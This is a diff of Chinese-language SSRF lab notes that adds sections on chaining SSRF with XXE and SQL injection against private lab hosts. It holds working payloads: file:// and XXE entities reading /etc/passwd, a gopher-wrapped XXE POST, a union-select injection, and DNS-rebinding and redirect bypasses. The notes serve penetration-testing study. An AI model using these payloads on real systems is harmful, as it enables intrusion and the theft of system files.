@@ -1,3 +1,5 @@
+
+
 ## 1.SSRF信息收集File伪协议
 
 file:///etc/passwd 读取文件passwd
@@ -34,8 +36,10 @@ http://172.250.250.1/$index$.php
 
 构造代码：
 
+```
 GET /name.php HTTP/1.1
 Host: 172.250.250.4
+```
 
 （这里会有个换行）
 
@@ -57,12 +61,14 @@ BurpSuite抓包：![image-20240401154607421](../images/image-20240401154607421.p
 
 需要保留的头部信息：
 
+```
 POST /name.php HTTP/1.1
 Host: 172.250.250.4
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
 
 name=jianjian
+```
 
 （构造代码）
 
@@ -96,7 +102,7 @@ header('Location:http://127.0.0.1/flag.php')
 
 访问公网下的index.php相当于访问127.0.0.1/flag.php
 
-## 7.SSRF只DNS重绑定绕过
+## 7.SSRF之DNS重绑定绕过
 
 https://lock.cmpxchg8b.com/rebinder.html
 
@@ -104,4 +110,56 @@ TTL最理想的设置为0，在第一次解析之后，立马换成我们想要�
 
 http://DNS域名/flag.php
 
-## 8.SSRF进行命令执行
+## 8.SSRF进行XXE漏洞利用
+
+### XXE漏洞
+
+```xml
+<?xml version = "1.0"?>
+<!DOCTYPE note[ <!ENTITY cc "aa"> ]>
+<na>&cc;</na>
+```
+
+```xml
+<?xml version = "1.0"?>
+<!DOCTYPE ANY[ <!ENTITY f SYSTEM "file:///C://Windows//win/ini"> ]>
+<x>&f;</x>
+```
+
+### 利用SSRF进行XXE漏洞
+
+使用gopher伪协议
+
+需要注意的是post提交的是哪个页面，有可能不是index.php
+
+```xml
+POST /doLogin.php HTTP/1.1
+Host: 172.250.250.6
+contentType: application/xml;charset=utf-8
+Content-Length: 131
+
+<!DOCTYPE ANY[ <!ENTITY admin SYSTEM "file:///etc/passwd"> ]><user><username>&admin;</username><password> admin</password></user> 
+```
+
+## 9.SSRF进行SQL注入
+
+使用<font color=Red>--%20</font>>注释
+
+使用hackbar提交时会对已经输入的内容进行一次URL编码,把%20替换成%2520
+
+SSRF需要两次URL编码 
+
+![image-20240407203908192](../images/image-20240407203908192.png)
+
+### gopher提交
+
+```xml
+gopher://172.250.250.11:80/_POST /Less-11/index.php HTTP/1.1
+HOST:172.250.250.11
+Content-Type:application/x-www-form-urlencoded
+Content_Length: 53
+Uname=-1' union select 1,2 #&passwd=123&submit=Submit
+```
+
+## 10.SSRF进行文件上传漏洞
+
